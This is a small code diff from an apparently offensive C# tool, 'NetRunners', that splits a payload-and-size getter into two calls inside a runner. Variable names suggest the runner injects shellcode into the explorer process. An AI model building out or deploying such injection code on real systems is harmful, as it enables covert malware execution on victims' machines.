@@ -20,8 +20,8 @@ namespace NetRunners.Runners
         {
             try
             {
-                var payload = GetPayloadAndSize();
                 byte[] buf = GetPayload();
+                int sBuf = GetSize();
                 int explorerPID;
                 IntPtr hProcess;
                 IntPtr hThread;
